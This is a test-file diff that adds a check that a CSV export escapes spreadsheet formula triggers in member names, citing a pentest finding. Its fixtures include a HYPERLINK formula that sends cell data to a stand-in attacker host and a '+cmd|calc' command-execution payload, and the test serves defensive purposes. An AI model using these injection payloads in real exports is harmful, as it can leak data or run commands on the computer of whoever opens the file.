@@ -88,6 +88,19 @@ describe('resilientCoverage and matrixCsv', () => {
     expect(csv[0]).toBe('Member,Alpha,Bravo');
     expect(csv[1]).toBe('"Doe, Jane",3,1');
   });
+  it('neutralizes formula triggers in member names (pentest 2026-11-22 N3)', () => {
+    const csv = matrixCsv(mini, [
+      member('=HYPERLINK("https://evil.example/?"&A1,"open")', { a: 3, b: 1 }),
+      member('+cmd|calc', { a: 1, b: 1 }),
+      member('@SUM(A1)', { a: 1, b: 1 }),
+      member('-2+3', { a: 1, b: 1 }),
+    ]).split('\n');
+    expect(csv[1]).toBe(`"'=HYPERLINK(""https://evil.example/?""&A1,""open"")",3,1`);
+    expect(csv[2]).toBe("'+cmd|calc,1,1");
+    expect(csv[3]).toBe("'@SUM(A1),1,1");
+    expect(csv[4]).toBe("'-2+3,1,1");
+    for (const row of csv) expect(row.replace(/^"/, '')).not.toMatch(/^[=+\-@\t\r]/);
+  });
 });
 
 describe('skills-matrix.json data integrity', () => {
